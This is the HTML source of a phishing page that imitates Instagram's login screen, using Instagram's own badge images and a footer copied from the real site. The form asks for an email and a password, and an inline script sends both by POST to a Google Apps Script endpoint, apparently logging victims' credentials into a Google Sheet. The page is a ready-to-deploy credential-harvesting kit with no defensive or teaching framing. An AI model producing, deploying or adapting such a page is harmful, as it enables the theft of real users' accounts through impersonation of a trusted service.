<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link href="style.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">

    <body>

        <div id="wrapper">
            <div class="container">
                <div class="phone-app-demo"></div>
                <div class="form-data">
                    <form name="submit-to-google-sheet">
                        <div class="logo">
                            <h1>Instagram.</h1>
                        </div>

                        <input name="email" type="text" placeholder="Email" required>

                        <input name="password" type="password" placeholder="password" required>

                        <button type="submit" class="btn btn-primary btn-kirim">Send</button>
                        <span class="has-separator">Or</span>
                        <a href="#" class="facebook-login">
                            <i class="fab fa-facebook"></i> Log in with Facebook
                        </a>
                        <a class="password-reset" href="#">Forgot password?</a>


                    </form>
                    <div class="sign-up">
                        Don't an account? <a href="#">Sign up</a>
                    </div>
                    <div class="get-the-app">
                        <span>Get the app</span>
                        <div class="badge">
                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="android App">
                            <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="ios app">
                        </div>
                    </div>
                </div>

                <script>
                    const scriptURL = 'https://script.google.com/macros/s/AKfycbxSmfVmkS7AGmLFS3_x36r6rquz0kVQcZIrn8PoPH7G03-doq6CXS3BYHViC75SmQc3/exec'
                    const form = document.forms['submit-to-google-sheet']

                    form.addEventListener('submit', e => {
                        e.preventDefault()
                        fetch(scriptURL, {
                                method: 'POST',
                                body: new FormData(form)
                            })
                            .then(response => console.log('Success!', response))
                            .catch(error => console.error('Error!', error.message))
                    })
                </script>
            </div>
            <footer>
                <div class="container">
                    <nav class="footer-nav">
                        <ul>
                            <li><a href="#">About Us</a></li>
                            <li><a href="#">Support</a></li>
                            <li><a href="#">Jobs</a></li>
                            <li><a href="#">Privacy</a></li>
                            <li><a href="#">Terms</a></li>
                            <li><a href="#">Profiles</a></li>
                            <li><a href="#">Languages</a></li>
                        </ul>
                    </nav>
                    <div class="copyright-notice">
                        &copy; 2019 Complaints
                    </div>
                </div>
            </footer>
        </div>
    </body>

</html>
